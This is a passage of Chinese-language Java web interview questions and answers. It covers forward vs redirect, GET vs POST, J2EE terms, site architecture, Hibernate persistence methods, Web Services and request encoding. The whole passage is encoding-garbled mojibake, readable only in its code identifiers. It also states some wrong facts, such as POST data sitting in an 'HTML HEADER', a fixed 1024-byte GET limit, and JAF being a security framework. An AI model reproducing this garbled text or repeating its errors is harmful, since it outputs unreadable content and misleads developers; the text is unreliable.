é«˜æ•ˆï¼Œæ‰€ä»¥åœ¨æ»¡è¶³éœ€è¦æ—¶å°½é‡ä½¿ç”¨forwardï¼ˆé€šè¿‡è°ƒç”¨RequestDispatcherå¯¹è±¡çš„forward()æ–¹æ³•ï¼Œè¯¥å¯¹è±¡å¯ä»¥é€šè¿‡ServletRequestå¯¹è±¡çš„getRequestDispatcher()æ–¹æ³•è·å¾—ï¼‰ï¼Œå¹¶ä¸”è¿™æ ·ä¹Ÿæœ‰åŠ©äºéšè—å®é™…çš„é“¾æ¥ï¼›åœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œæ¯”å¦‚éœ€è¦è®¿é—®ä¸€ä¸ªå…¶å®ƒæœåŠ¡å™¨ä¸Šçš„èµ„æºï¼Œåˆ™å¿…é¡»ä½¿ç”¨é‡å®šå‘ï¼ˆé€šè¿‡HttpServletResponseå¯¹è±¡è°ƒç”¨å…¶sendRedirect()æ–¹æ³•å®ç°ï¼‰ã€‚ getå’Œpostçš„åŒºåˆ«ï¼Ÿï¼ˆ1ï¼‰åœ¨å®¢æˆ·ç«¯ï¼Œ Get æ–¹å¼åœ¨é€šè¿‡ URL æäº¤æ•°æ®ï¼Œæ•°æ® åœ¨URLä¸­å¯ä»¥çœ‹åˆ°ï¼›POSTæ–¹å¼ï¼Œæ•°æ®æ”¾ç½®åœ¨HTML HEADERå†…æäº¤ã€‚ ï¼ˆ2ï¼‰GETæ–¹å¼æäº¤çš„æ•°æ®æœ€å¤šåªèƒ½æœ‰1024å­—èŠ‚ï¼Œè€ŒPOSTåˆ™æ²¡æœ‰æ­¤é™åˆ¶ã€‚ ï¼ˆ3ï¼‰å®‰å…¨æ€§é—®é¢˜ã€‚æ­£å¦‚åœ¨ï¼ˆ 1 ï¼‰ä¸­æåˆ°ï¼Œä½¿ç”¨ Get çš„æ—¶å€™ï¼Œå‚æ•°ä¼šæ˜¾ç¤ºåœ¨åœ°å€æ ä¸Šï¼Œè€Œ Post ä¸ä¼šã€‚æ‰€ä»¥ï¼Œå¦‚æœè¿™äº›æ•°æ®æ˜¯ä¸­æ–‡æ•°æ®è€Œä¸”æ˜¯éæ•æ„Ÿæ•°æ®ï¼Œé‚£ä¹ˆä½¿ç”¨ get ï¼›å¦‚æœç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸æ˜¯ä¸­æ–‡å­—ç¬¦è€Œä¸”åŒ…å«æ•æ„Ÿæ•°æ®ï¼Œé‚£ä¹ˆè¿˜æ˜¯ä½¿ç”¨ post ä¸ºå¥½ã€‚ å®‰å…¨çš„å’Œå¹‚ç­‰çš„ã€‚æ‰€è°“å®‰å…¨çš„æ„å‘³ç€è¯¥æ“ä½œç”¨äºè·å–ä¿¡æ¯è€Œéä¿®æ”¹ä¿¡æ¯ã€‚å¹‚ç­‰çš„æ„å‘³ç€å¯¹åŒä¸€ URL çš„å¤šä¸ªè¯·æ±‚åº”è¯¥è¿”å›åŒæ ·çš„ç»“æœã€‚å®Œæ•´çš„å®šä¹‰å¹¶ä¸åƒçœ‹èµ·æ¥é‚£æ ·ä¸¥æ ¼ã€‚æ¢å¥è¯è¯´ï¼Œ GET è¯·æ±‚ä¸€èˆ¬ä¸åº”äº§ç”Ÿå‰¯ä½œç”¨ã€‚ä»æ ¹æœ¬ä¸Šè®²ï¼Œå…¶ç›®æ ‡æ˜¯å½“ç”¨æˆ·æ‰“å¼€ä¸€ä¸ªé“¾æ¥æ—¶ï¼Œå¥¹å¯ä»¥ç¡®ä¿¡ä»è‡ªèº«çš„è§’åº¦æ¥çœ‹æ²¡æœ‰æ”¹å˜èµ„æºã€‚æ¯”å¦‚ï¼Œæ–°é—»ç«™ç‚¹çš„å¤´ç‰ˆä¸æ–­æ›´æ–°ã€‚è™½ç„¶ç¬¬äºŒæ¬¡è¯·æ±‚ä¼šè¿”å›ä¸åŒçš„ä¸€æ‰¹æ–°é—»ï¼Œè¯¥æ“ä½œä»ç„¶è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„å’Œå¹‚ç­‰çš„ï¼Œå› ä¸ºå®ƒæ€»æ˜¯è¿”å›å½“å‰çš„æ–°é—»ã€‚åä¹‹äº¦ç„¶ã€‚ POST è¯·æ±‚å°±ä¸é‚£ä¹ˆè½»æ¾äº†ã€‚ POST è¡¨ç¤ºå¯èƒ½æ”¹å˜æœåŠ¡å™¨ä¸Šçš„èµ„æºçš„è¯·æ±‚ã€‚ä»ç„¶ä»¥æ–°é—»ç«™ç‚¹ä¸ºä¾‹ï¼Œè¯»è€…å¯¹æ–‡ç« çš„æ³¨è§£åº”è¯¥é€šè¿‡ POST è¯·æ±‚å®ç°ï¼Œå› ä¸ºåœ¨æ³¨è§£æäº¤ä¹‹åç«™ç‚¹å·²ç»ä¸åŒäº†ï¼ˆæ¯”æ–¹è¯´æ–‡ç« ä¸‹é¢å‡ºç°ä¸€æ¡æ³¨è§£ï¼‰ã€‚ è¯·å¯¹ä»¥ä¸‹åœ¨J2EEä¸­å¸¸ç”¨çš„åè¯è¿›è¡Œè§£é‡Š(æˆ–ç®€å•æè¿°) web å®¹å™¨ï¼šç»™å¤„äºå…¶ä¸­çš„åº”ç”¨ç¨‹åºç»„ä»¶ï¼ˆJSPï¼ŒSERVLETï¼‰æä¾›ä¸€ä¸ªç¯å¢ƒï¼Œä½¿JSP,SERVLETç›´æ¥å’Œå®¹å™¨ä¸­çš„ç¯å¢ƒå˜é‡æ¥æ¥å£äº’ï¼Œä¸å¿…å…³æ³¨å…¶å®ƒç³»ç»Ÿé—®é¢˜ã€‚ä¸»è¦æœ‰WEBæœåŠ¡å™¨æ¥å®ç°ã€‚ä¾‹å¦‚ï¼šTOMCAT,WEBLOGIC,WEBSPHEREç­‰ã€‚è¯¥å®¹å™¨æä¾›çš„æ¥å£ä¸¥æ ¼éµå®ˆJ2EEè§„èŒƒä¸­çš„WEBAPPLICATION æ ‡å‡†ã€‚æˆ‘ä»¬æŠŠéµå®ˆä»¥ä¸Šæ ‡å‡†çš„WEBæœåŠ¡å™¨å°±å«åšJ2EEä¸­çš„WEBå®¹å™¨ã€‚Web containerï¼šå®ç°J2EEä½“ç³»ç»“æ„ä¸­Webç»„ä»¶åè®®çš„å®¹å™¨ã€‚è¿™ä¸ªåè®®è§„å®šäº†ä¸€ä¸ªWebç»„ä»¶è¿è¡Œæ—¶çš„ç¯å¢ƒï¼ŒåŒ…æ‹¬å®‰å…¨ï¼Œä¸€è‡´æ€§ï¼Œç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œäº‹åŠ¡ï¼Œé…ç½®å’Œå…¶å®ƒçš„æœåŠ¡ã€‚ä¸€ä¸ªæä¾›å’ŒJSPå’ŒJ2EEå¹³å°APIsç•Œé¢ç›¸åŒæœåŠ¡çš„å®¹å™¨ã€‚ä¸€ä¸ªWeb container ç”±WebæœåŠ¡å™¨æˆ–è€…J2EEæœåŠ¡å™¨æä¾›ã€‚EJBå®¹å™¨ï¼šEnterprise java bean å®¹å™¨ã€‚æ›´å…·æœ‰è¡Œä¸šé¢†åŸŸç‰¹è‰²ã€‚ä»–æä¾›ç»™è¿è¡Œåœ¨å…¶ä¸­çš„ç»„ä»¶EJBå„ç§ç®¡ç†åŠŸèƒ½ã€‚åªè¦æ»¡è¶³J2EEè§„èŒƒçš„EJBæ”¾å…¥è¯¥å®¹å™¨ï¼Œé©¬ä¸Šå°±ä¼šè¢«å®¹å™¨è¿›è¡Œé«˜æ•ˆç‡çš„ç®¡ç†ã€‚å¹¶ä¸”å¯ä»¥é€šè¿‡ç°æˆçš„æ¥å£æ¥è·å¾—ç³»ç»Ÿçº§åˆ«çš„æœåŠ¡ã€‚ä¾‹å¦‚é‚®ä»¶æœåŠ¡ã€äº‹åŠ¡ç®¡ç†ã€‚ä¸€ä¸ªå®ç°äº†J2EEä½“ç³»ç»“æ„ä¸­EJBç»„ä»¶è§„èŒƒçš„å®¹å™¨ã€‚è¿™ä¸ªè§„èŒƒæŒ‡å®šäº†ä¸€ä¸ªEnterprise beançš„è¿è¡Œæ—¶ç¯å¢ƒï¼ŒåŒ…æ‹¬å®‰å…¨ï¼Œä¸€è‡´æ€§ï¼Œç”Ÿå‘½å‘¨æœŸï¼Œäº‹åŠ¡ï¼Œé…ç½®ï¼Œå’Œå…¶ä»–çš„æœåŠ¡ã€‚JNDIï¼šï¼ˆJava Naming &amp; Directory Interfaceï¼‰JAVAå‘½åç›®å½•æœåŠ¡ã€‚ä¸»è¦æä¾›çš„åŠŸèƒ½æ˜¯ï¼šæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œè®©å…¶å®ƒå„åœ°çš„åº”ç”¨ç¨‹åºåœ¨å…¶ä¸Šé¢ç•™ä¸‹è‡ªå·±çš„ç´¢å¼•ï¼Œä»è€Œæ»¡è¶³å¿«é€ŸæŸ¥æ‰¾å’Œå®šä½åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„åŠŸèƒ½ã€‚JMSï¼šï¼ˆJava Message Serviceï¼‰JAVAæ¶ˆæ¯æœåŠ¡ã€‚ä¸»è¦å®ç°å„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´çš„é€šè®¯ã€‚åŒ…æ‹¬ç‚¹å¯¹ç‚¹å’Œå¹¿æ’­ã€‚JTAï¼šï¼ˆJava Transaction APIï¼‰JAVAäº‹åŠ¡æœåŠ¡ã€‚æä¾›å„ç§åˆ†å¸ƒå¼äº‹åŠ¡æœåŠ¡ã€‚åº”ç”¨ç¨‹åºåªéœ€è°ƒç”¨å…¶æä¾›çš„æ¥å£å³å¯ã€‚JAFï¼šï¼ˆJava Action FrameWorkï¼‰JAVAå®‰å…¨è®¤è¯æ¡†æ¶ã€‚æä¾›ä¸€äº›å®‰å…¨æ§åˆ¶æ–¹é¢çš„æ¡†æ¶ã€‚è®©å¼€å‘è€…é€šè¿‡å„ç§éƒ¨ç½²å’Œè‡ªå®šä¹‰å®ç°è‡ªå·±çš„ä¸ªæ€§å®‰å…¨æ§åˆ¶ç­–ç•¥ã€‚RMI/IIOP: ï¼ˆRemote Method Invocation /internetå¯¹è±¡è¯·æ±‚ä¸­ä»‹åè®®ï¼‰ä»–ä»¬ä¸»è¦ç”¨äºé€šè¿‡è¿œç¨‹è°ƒç”¨æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œè¿œç¨‹æœ‰ä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œä¸€ä¸ªç¨‹åºï¼Œå®ƒæä¾›è‚¡ç¥¨åˆ†ææœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå®ç°å¯¹å…¶ç›´æ¥è°ƒç”¨ã€‚å½“ç„¶è¿™æ˜¯è¦é€šè¿‡ä¸€å®šçš„è§„èŒƒæ‰èƒ½åœ¨å¼‚æ„çš„ç³»ç»Ÿä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚RMIæ˜¯JAVAç‰¹æœ‰çš„ã€‚RMI-IIOPå‡ºç°ä»¥å‰ï¼Œåªæœ‰RMIå’Œ CORBAä¸¤ç§é€‰æ‹©æ¥è¿›è¡Œåˆ†å¸ƒå¼ç¨‹åºè®¾è®¡ã€‚RMI-IIOPç»¼åˆäº†RMIå’ŒCORBAçš„ä¼˜ç‚¹ï¼Œå…‹æœäº†ä»–ä»¬çš„ç¼ºç‚¹ï¼Œä½¿å¾—ç¨‹åºå‘˜èƒ½æ›´æ–¹ä¾¿çš„ç¼–å†™åˆ†å¸ƒå¼ç¨‹åºè®¾è®¡ï¼Œå®ç°åˆ†å¸ƒå¼è®¡ç®—ã€‚é¦–å…ˆï¼ŒRMI-IIOPç»¼åˆäº†RMIçš„ç®€å•æ€§å’ŒCORBAçš„å¤šè¯­è¨€æ€§ï¼ˆå…¼å®¹æ€§ï¼‰ï¼Œå…¶æ¬¡RMI-IIOPå…‹æœäº†RMIåªèƒ½ç”¨äºJava çš„ç¼ºç‚¹å’ŒCORBAçš„å¤æ‚æ€§ã€‚ ç½‘ç«™åœ¨æ¶æ„ä¸Šåº”å½“è€ƒè™‘å“ªäº›é—®é¢˜ï¼Ÿ - åˆ†å±‚ï¼šåˆ†å±‚æ˜¯å¤„ç†ä»»ä½•å¤æ‚ç³»ç»Ÿæœ€å¸¸è§çš„æ‰‹æ®µä¹‹ä¸€ï¼Œå°†ç³»ç»Ÿæ¨ªå‘åˆ‡åˆ†æˆè‹¥å¹²ä¸ªå±‚é¢ï¼Œæ¯ä¸ªå±‚é¢åªæ‰¿æ‹…å•ä¸€çš„èŒè´£ï¼Œç„¶åé€šè¿‡ä¸‹å±‚ä¸ºä¸Šå±‚æä¾›çš„åŸºç¡€è®¾æ–½å’ŒæœåŠ¡ä»¥åŠä¸Šå±‚å¯¹ä¸‹å±‚çš„è°ƒç”¨æ¥å½¢æˆä¸€ä¸ªå®Œæ•´çš„å¤æ‚çš„ç³»ç»Ÿã€‚è®¡ç®—æœºç½‘ç»œçš„å¼€æ”¾ç³»ç»Ÿäº’è”å‚è€ƒæ¨¡å‹ï¼ˆOSI/RMï¼‰å’ŒInternetçš„TCP/IPæ¨¡å‹éƒ½æ˜¯åˆ†å±‚ç»“æ„ï¼Œå¤§å‹ç½‘ç«™çš„è½¯ä»¶ç³»ç»Ÿä¹Ÿå¯ä»¥ä½¿ç”¨åˆ†å±‚çš„ç†å¿µå°†å…¶åˆ†ä¸ºæŒä¹…å±‚ï¼ˆæä¾›æ•°æ®å­˜å‚¨å’Œè®¿é—®æœåŠ¡ï¼‰ã€ä¸šåŠ¡å±‚ï¼ˆå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œç³»ç»Ÿä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼‰å’Œè¡¨ç¤ºå±‚ï¼ˆç³»ç»Ÿäº¤äº’ã€è§†å›¾å±•ç¤ºï¼‰ã€‚éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼šï¼ˆ1ï¼‰åˆ†å±‚æ˜¯é€»è¾‘ä¸Šçš„åˆ’åˆ†ï¼Œåœ¨ç‰©ç†ä¸Šå¯ä»¥ä½äºåŒä¸€è®¾å¤‡ä¸Šä¹Ÿå¯ä»¥åœ¨ä¸åŒçš„è®¾å¤‡ä¸Šéƒ¨ç½²ä¸åŒçš„åŠŸèƒ½æ¨¡å—ï¼Œè¿™æ ·å¯ä»¥ä½¿ç”¨æ›´å¤šçš„è®¡ç®—èµ„æºæ¥åº”å¯¹ç”¨æˆ·çš„å¹¶å‘è®¿é—®ï¼›ï¼ˆ2ï¼‰å±‚ä¸å±‚ä¹‹é—´åº”å½“æœ‰æ¸…æ™°çš„è¾¹ç•Œï¼Œè¿™æ ·åˆ†å±‚æ‰æœ‰æ„ä¹‰ï¼Œæ‰æ›´åˆ©äºè½¯ä»¶çš„å¼€å‘å’Œç»´æŠ¤ã€‚- åˆ†å‰²ï¼šåˆ†å‰²æ˜¯å¯¹è½¯ä»¶çš„çºµå‘åˆ‡åˆ†ã€‚æˆ‘ä»¬å¯ä»¥å°†å¤§å‹ç½‘ç«™çš„ä¸åŒåŠŸèƒ½å’ŒæœåŠ¡åˆ†å‰²å¼€ï¼Œå½¢æˆé«˜å†…èšä½è€¦åˆçš„åŠŸèƒ½æ¨¡å—ï¼ˆå•å…ƒï¼‰ã€‚åœ¨è®¾è®¡åˆæœŸå¯ä»¥åšä¸€ä¸ªç²—ç²’åº¦çš„åˆ†å‰²ï¼Œå°†ç½‘ç«™åˆ†å‰²ä¸ºè‹¥å¹²ä¸ªåŠŸèƒ½æ¨¡å—ï¼ŒåæœŸè¿˜å¯ä»¥è¿›ä¸€æ­¥å¯¹æ¯ä¸ªæ¨¡å—è¿›è¡Œç»†ç²’åº¦çš„åˆ†å‰²ï¼Œè¿™æ ·ä¸€æ–¹é¢æœ‰åŠ©äºè½¯ä»¶çš„å¼€å‘å’Œç»´æŠ¤ï¼Œå¦ä¸€æ–¹é¢æœ‰åŠ©äºåˆ†å¸ƒå¼çš„éƒ¨ç½²ï¼Œæä¾›ç½‘ç«™çš„å¹¶å‘å¤„ç†èƒ½åŠ›å’ŒåŠŸèƒ½çš„æ‰©å±•ã€‚- åˆ†å¸ƒå¼ï¼šé™¤äº†ä¸Šé¢æåˆ°çš„å†…å®¹ï¼Œç½‘ç«™çš„é™æ€èµ„æºï¼ˆJavaScriptã€CSSã€å›¾ç‰‡ç­‰ï¼‰ä¹Ÿå¯ä»¥é‡‡ç”¨ç‹¬ç«‹åˆ†å¸ƒå¼éƒ¨ç½²å¹¶é‡‡ç”¨ç‹¬ç«‹çš„åŸŸåï¼Œè¿™æ ·å¯ä»¥å‡è½»åº”ç”¨æœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›ï¼Œä¹Ÿä½¿å¾—æµè§ˆå™¨å¯¹èµ„æºçš„åŠ è½½æ›´å¿«ã€‚æ•°æ®çš„å­˜å–ä¹Ÿåº”è¯¥æ˜¯åˆ†å¸ƒå¼çš„ï¼Œä¼ ç»Ÿçš„å•†ä¸šçº§å…³ç³»å‹æ•°æ®åº“äº§å“åŸºæœ¬ä¸Šéƒ½æ”¯æŒåˆ†å¸ƒå¼éƒ¨ç½²ï¼Œè€Œæ–°ç”Ÿçš„NoSQLäº§å“å‡ ä¹éƒ½æ˜¯åˆ†å¸ƒå¼çš„ã€‚å½“ç„¶ï¼Œç½‘ç«™åå°çš„ä¸šåŠ¡å¤„ç†ä¹Ÿè¦ä½¿ç”¨åˆ†å¸ƒå¼æŠ€æœ¯ï¼Œä¾‹å¦‚æŸ¥è¯¢ç´¢å¼•çš„æ„å»ºã€æ•°æ®åˆ†æç­‰ï¼Œè¿™äº›ä¸šåŠ¡è®¡ç®—è§„æ¨¡åºå¤§ï¼Œå¯ä»¥ä½¿ç”¨Hadoopä»¥åŠMapReduceåˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶æ¥å¤„ç†ã€‚- é›†ç¾¤ï¼šé›†ç¾¤ä½¿å¾—æœ‰æ›´å¤šçš„æœåŠ¡å™¨æä¾›ç›¸åŒçš„æœåŠ¡ï¼Œå¯ä»¥æ›´å¥½çš„æä¾›å¯¹å¹¶å‘çš„æ”¯æŒã€‚- ç¼“å­˜ï¼šæ‰€è°“ç¼“å­˜å°±æ˜¯ç”¨ç©ºé—´æ¢å–æ—¶é—´çš„æŠ€æœ¯ï¼Œå°†æ•°æ®å°½å¯èƒ½æ”¾åœ¨è·ç¦»è®¡ç®—æœ€è¿‘çš„ä½ç½®ã€‚ä½¿ç”¨ç¼“å­˜æ˜¯ç½‘ç«™ä¼˜åŒ–çš„ç¬¬ä¸€å®šå¾‹ã€‚æˆ‘ä»¬é€šå¸¸è¯´çš„CDNã€åå‘ä»£ç†ã€çƒ­ç‚¹æ•°æ®éƒ½æ˜¯å¯¹ç¼“å­˜æŠ€æœ¯çš„ä½¿ç”¨ã€‚- å¼‚æ­¥ï¼šå¼‚æ­¥æ˜¯å®ç°è½¯ä»¶å®ä½“ä¹‹é—´è§£è€¦åˆçš„åˆä¸€é‡è¦æ‰‹æ®µã€‚å¼‚æ­¥æ¶æ„æ˜¯å…¸å‹çš„ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å¼ï¼ŒäºŒè€…ä¹‹é—´æ²¡æœ‰ç›´æ¥çš„è°ƒç”¨å…³ç³»ï¼Œåªè¦ä¿æŒæ•°æ®ç»“æ„ä¸å˜ï¼Œå½¼æ­¤åŠŸèƒ½å®ç°å¯ä»¥éšæ„å˜åŒ–è€Œä¸äº’ç›¸å½±å“ï¼Œè¿™å¯¹ç½‘ç«™çš„æ‰©å±•éå¸¸æœ‰åˆ©ã€‚ä½¿ç”¨å¼‚æ­¥å¤„ç†è¿˜å¯ä»¥æé«˜ç³»ç»Ÿå¯ç”¨æ€§ï¼ŒåŠ å¿«ç½‘ç«™çš„å“åº”é€Ÿåº¦ï¼ˆç”¨AjaxåŠ è½½æ•°æ®å°±æ˜¯ä¸€ç§å¼‚æ­¥æŠ€æœ¯ï¼‰ï¼ŒåŒæ—¶è¿˜å¯ä»¥èµ·åˆ°å‰Šå³°ä½œç”¨ï¼ˆåº”å¯¹ç¬æ—¶é«˜å¹¶å‘ï¼‰ã€‚&amp;quotï¼›èƒ½æ¨è¿Ÿå¤„ç†çš„éƒ½è¦æ¨è¿Ÿå¤„ç†â€æ˜¯ç½‘ç«™ä¼˜åŒ–çš„ç¬¬äºŒå®šå¾‹ï¼Œè€Œå¼‚æ­¥æ˜¯è·µè¡Œç½‘ç«™ä¼˜åŒ–ç¬¬äºŒå®šå¾‹çš„é‡è¦æ‰‹æ®µã€‚- å†—ä½™ï¼šå„ç§æœåŠ¡å™¨éƒ½è¦æä¾›ç›¸åº”çš„å†—ä½™æœåŠ¡å™¨ä»¥ä¾¿åœ¨æŸå°æˆ–æŸäº›æœåŠ¡å™¨å®•æœºæ—¶è¿˜èƒ½ä¿è¯ç½‘ç«™å¯ä»¥æ­£å¸¸å·¥ä½œï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ç¾éš¾æ¢å¤çš„å¯èƒ½æ€§ã€‚å†—ä½™æ˜¯ç½‘ç«™é«˜å¯ç”¨æ€§çš„é‡è¦ä¿è¯ã€‚ hibernateçš„ save() å’Œpersist() æ–¹æ³•åˆ†åˆ«æ˜¯åšä»€ä¹ˆçš„ï¼Ÿæœ‰ä»€ä¹ˆåŒºåˆ«ï¼ŸHibernateçš„å¯¹è±¡æœ‰ä¸‰ç§çŠ¶æ€ï¼šç¬æ—¶æ€ï¼ˆtransientï¼‰ã€æŒä¹…æ€ï¼ˆpersistentï¼‰å’Œæ¸¸ç¦»æ€ï¼ˆdetachedï¼‰ï¼Œå¦‚ç¬¬135é¢˜ä¸­çš„å›¾æ‰€ç¤ºã€‚ç¬æ—¶æ€çš„å®ä¾‹å¯ä»¥é€šè¿‡è°ƒç”¨save()ã€persist()æˆ–è€…saveOrUpdate()æ–¹æ³•å˜æˆæŒä¹…æ€ï¼›æ¸¸ç¦»æ€çš„å®ä¾‹å¯ä»¥é€šè¿‡è°ƒç”¨ update()ã€saveOrUpdate()ã€lock()æˆ–è€…replicate()å˜æˆæŒä¹…æ€ã€‚save()å’Œpersist()å°†ä¼šå¼•å‘SQLçš„INSERTè¯­å¥ï¼Œè€Œupdate()æˆ–merge()ä¼šå¼•å‘UPDATEè¯­å¥ã€‚save()å’Œupdate()çš„åŒºåˆ«åœ¨äºä¸€ä¸ªæ˜¯å°†ç¬æ—¶æ€å¯¹è±¡å˜æˆæŒä¹…æ€ï¼Œä¸€ä¸ªæ˜¯å°†æ¸¸ç¦»æ€å¯¹è±¡å˜ä¸ºæŒä¹…æ€ã€‚merge()æ–¹æ³•å¯ä»¥å®Œæˆsave()å’Œupdate()æ–¹æ³•çš„åŠŸèƒ½ï¼Œå®ƒçš„æ„å›¾æ˜¯å°†æ–°çš„çŠ¶æ€åˆå¹¶åˆ°å·²æœ‰çš„æŒä¹…åŒ–å¯¹è±¡ä¸Šæˆ–åˆ›å»ºæ–°çš„æŒä¹…åŒ–å¯¹è±¡ã€‚å¯¹äºpersist()æ–¹æ³•ï¼ŒæŒ‰ç…§å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ï¼šâ‘  persist()æ–¹æ³•æŠŠä¸€ä¸ªç¬æ—¶æ€çš„å®ä¾‹æŒä¹…åŒ–ï¼Œä½†æ˜¯å¹¶ä¸ä¿è¯æ ‡è¯†ç¬¦è¢«ç«‹åˆ»å¡«å…¥åˆ°æŒä¹…åŒ–å®ä¾‹ä¸­ï¼Œæ ‡è¯†ç¬¦çš„å¡«å…¥å¯èƒ½è¢«æ¨è¿Ÿåˆ°flushçš„æ—¶é—´ï¼›â‘¡ persist()æ–¹æ³•ä¿è¯å½“å®ƒåœ¨ä¸€ä¸ªäº‹åŠ¡å¤–éƒ¨è¢«è°ƒç”¨çš„æ—¶å€™å¹¶ä¸è§¦å‘ä¸€ä¸ªINSERTè¯­å¥ï¼Œå½“éœ€è¦å°è£…ä¸€ä¸ªé•¿ä¼šè¯æµç¨‹çš„æ—¶å€™ï¼Œpersist()æ–¹æ³•æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼›â‘¢ save()æ–¹æ³•ä¸ä¿è¯ç¬¬â‘¡æ¡ï¼Œå®ƒè¦è¿”å›æ ‡è¯†ç¬¦ï¼Œæ‰€ä»¥å®ƒä¼šç«‹å³æ‰§è¡ŒINSERTè¯­å¥ï¼Œä¸ç®¡æ˜¯åœ¨äº‹åŠ¡å†…éƒ¨è¿˜æ˜¯å¤–éƒ¨ã€‚è‡³äºlock()æ–¹æ³•å’Œupdate()æ–¹æ³•çš„åŒºåˆ«ï¼Œupdate()æ–¹æ³•æ˜¯æŠŠä¸€ä¸ªå·²ç»æ›´æ”¹è¿‡çš„è„±ç®¡çŠ¶æ€çš„å¯¹è±¡å˜æˆæŒä¹…çŠ¶æ€ï¼›lock()æ–¹æ³•æ˜¯æŠŠä¸€ä¸ªæ²¡æœ‰æ›´æ”¹è¿‡çš„è„±ç®¡çŠ¶æ€çš„å¯¹è±¡å˜æˆæŒä¹…çŠ¶æ€ã€‚ ä»€ä¹ˆæ˜¯Web Serviceï¼Ÿä»è¡¨é¢ä¸Šçœ‹ï¼ŒWeb Serviceå°±æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œå®ƒå‘å¤–ç•Œæš´éœ²å‡ºä¸€ä¸ªèƒ½å¤Ÿé€šè¿‡Webè¿›è¡Œè°ƒç”¨çš„APIã€‚è¿™å°±æ˜¯è¯´ï¼Œä½ èƒ½å¤Ÿç”¨ç¼–ç¨‹çš„æ–¹æ³•é€æ˜çš„è°ƒç”¨è¿™ä¸ªåº”ç”¨ç¨‹åºï¼Œä¸éœ€è¦äº†è§£å®ƒçš„ä»»ä½•ç»†èŠ‚ï¼Œè·Ÿä½ ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚ä¾‹å¦‚å¯ä»¥åˆ›å»ºä¸€ä¸ªæä¾›å¤©æ°”é¢„æŠ¥çš„Web Serviceï¼Œé‚£ä¹ˆæ— è®ºä½ ç”¨å“ªç§ç¼–ç¨‹è¯­è¨€å¼€å‘çš„åº”ç”¨éƒ½å¯ä»¥é€šè¿‡è°ƒç”¨å®ƒçš„APIå¹¶ä¼ å…¥åŸå¸‚ä¿¡æ¯æ¥è·å¾—è¯¥åŸå¸‚çš„å¤©æ°”é¢„æŠ¥ã€‚ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸ºWeb Serviceï¼Œæ˜¯å› ä¸ºå®ƒåŸºäºHTTPåè®®ä¼ è¾“æ•°æ®ï¼Œè¿™ä½¿å¾—è¿è¡Œåœ¨ä¸åŒæœºå™¨ä¸Šçš„ä¸åŒåº”ç”¨æ— é¡»å€ŸåŠ©é™„åŠ çš„ã€ä¸“é—¨çš„ç¬¬ä¸‰æ–¹è½¯ä»¶æˆ–ç¡¬ä»¶ï¼Œå°±å¯ç›¸äº’äº¤æ¢æ•°æ®æˆ–é›†æˆã€‚ SOAï¼ˆService-Oriented Architectureï¼Œé¢å‘æœåŠ¡çš„æ¶æ„ï¼‰ï¼ŒSOAæ˜¯ä¸€ç§æ€æƒ³ï¼Œå®ƒå°†åº”ç”¨ç¨‹åºçš„ä¸åŒåŠŸèƒ½å•å…ƒé€šè¿‡ä¸­ç«‹çš„å¥‘çº¦è”ç³»èµ·æ¥ï¼Œç‹¬ç«‹äºç¡¬ä»¶å¹³å°ã€æ“ä½œç³»ç»Ÿå’Œç¼–ç¨‹è¯­è¨€ï¼Œä½¿å¾—å„ç§å½¢å¼çš„åŠŸèƒ½å•å…ƒèƒ½å¤Ÿæ›´å¥½çš„é›†æˆã€‚æ˜¾ç„¶ï¼ŒWeb Serviceæ˜¯SOAçš„ä¸€ç§è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒæ›´å¤šçš„æ˜¯ä¸€ç§æ ‡å‡†ï¼Œè€Œä¸æ˜¯ä¸€ç§å…·ä½“çš„æŠ€æœ¯ã€‚ å¦‚ä½•è®¾ç½®è¯·æ±‚çš„ç¼–ç ä»¥åŠå“åº”å†…å®¹çš„ç±»å‹ï¼Ÿé€šè¿‡è¯·æ±‚å¯¹è±¡ï¼ˆServletRequestï¼‰çš„setCharacterEncoding(String)æ–¹æ³•å¯ä»¥è®¾ç½®è¯·æ±‚çš„ç¼–ç ï¼Œå…¶å®è¦å½»åº•è§£å†³ä¹±ç é—®é¢˜å°±åº”è¯¥è®©é¡µé¢ã€æœåŠ¡å™¨ã€è¯·æ±‚å’Œå“åº”ã€Javaç¨‹åºéƒ½ä½¿ç”¨ç»Ÿä¸€çš„ç¼–ç ï¼Œæœ€å¥½çš„é€‰æ‹©å½“ç„¶æ˜¯UTF-8ï¼›é€šè¿‡å“åº”å¯¹è±¡ï¼ˆServletResponseï¼‰çš„setContentType(String)æ–¹æ³•å¯ä»¥è®¾ç½®å“åº”å†…å®¹çš„ç±»å‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡HttpServletResponsedå¯¹è±¡çš„setHeader(String, String)æ–¹æ³•æ¥è®¾ç½®ã€‚ è¯´æ˜ BSä¸CS 